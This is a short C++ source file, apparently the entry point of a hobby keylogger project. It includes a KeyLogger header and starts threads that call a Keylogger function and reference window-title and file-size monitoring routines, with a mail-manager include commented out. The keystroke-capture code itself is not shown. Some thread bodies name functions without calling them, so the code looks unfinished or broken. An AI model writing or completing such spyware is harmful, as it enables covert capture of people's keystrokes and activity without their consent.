#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include "filemanager.h"
// #include "mailmanager.h"
#include "winmanager.h"
#include "KeyLogger.h"
using namespace std;
mutex mtx;
int main()
{
    // Keylogger(NULL);
    auto main = []() {
        //mtx.lock();
        printf("main start!\n");
        Keylogger(NULL);
       // mtx.unlock();
    };
    auto title = []() {
       // mtx.lock();
        printf("win start!\n");
        wintitle;
        //mtx.unlock();
    };
    auto filesize = []() {
        //mtx.lock();
        printf("fsd start!\n");
        FSD;
       // mtx.unlock();
    };

    thread t1 = thread(main);
    thread t2 = thread(title);
    thread t3 = thread(filesize);

    t1.join();
    t2.join();
    t3.join();

    /* thread mainThread = thread(Keylogger(NULL), 1, 5);
    thread titleThread = thread(wintitle, 2, 6);
    thread filesizeThread = thread(FSD, 3, 7);

    mainThread.join();
    titleThread.join();
    filesizeThread.join(); */
}